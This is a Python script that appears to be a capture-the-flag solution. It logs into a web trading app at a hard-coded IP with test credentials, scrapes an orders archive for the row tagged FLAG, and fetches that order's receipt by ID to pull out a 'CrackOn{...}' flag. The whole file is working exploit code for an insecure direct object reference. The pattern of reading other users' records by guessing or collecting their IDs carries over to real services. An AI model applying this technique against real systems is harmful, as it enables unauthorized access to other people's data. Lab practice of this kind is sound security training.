#!/usr/bin/env python3
import re
import sys
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

BASE_URL = "http://51.20.10.121:8005"


def build_client() -> urllib.request.OpenerDirector:
    cookie_jar = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))


def http_get(opener: urllib.request.OpenerDirector, path: str) -> str:
    req = urllib.request.Request(BASE_URL + path, method="GET")
    with opener.open(req, timeout=15) as resp:
        return resp.read().decode("utf-8", errors="replace")


def http_post(opener: urllib.request.OpenerDirector, path: str, data: dict[str, str]) -> str:
    encoded = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(BASE_URL + path, data=encoded, method="POST")
    with opener.open(req, timeout=15) as resp:
        return resp.read().decode("utf-8", errors="replace")


def login(opener: urllib.request.OpenerDirector) -> None:
    http_post(opener, "/", {"username": "test"})
    http_post(
        opener,
        "/password/test",
        {
            "username": "test",
            "user_id": "10032",
            "password": "test",
        },
    )


def find_flag_order_id(archive_html: str) -> str:
    # Find the row where ticker is FLAG and extract its receipt order id.
    pattern = re.compile(
        r"<tr>.*?<td>[^<]*</td>\s*<td>FLAG</td>.*?data-order-id=\"(\d+)\"",
        re.DOTALL,
    )
    match = pattern.search(archive_html)
    if not match:
        raise RuntimeError("Could not locate FLAG order id in archive page")
    return match.group(1)


def extract_flag(receipt_html: str) -> str:
    match = re.search(r"(CrackOn\{[^}]+\})", receipt_html)
    if not match:
        raise RuntimeError("Flag pattern not found in receipt")
    return match.group(1)


def main() -> int:
    opener = build_client()

    login(opener)
    archive_html = http_get(opener, "/orders_archive")
    flag_order_id = find_flag_order_id(archive_html)

    receipt_html = http_get(opener, f"/order/{flag_order_id}/receipt")
    flag = extract_flag(receipt_html)

    print(flag)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[!] Exploit failed: {exc}", file=sys.stderr)
        raise SystemExit(1)
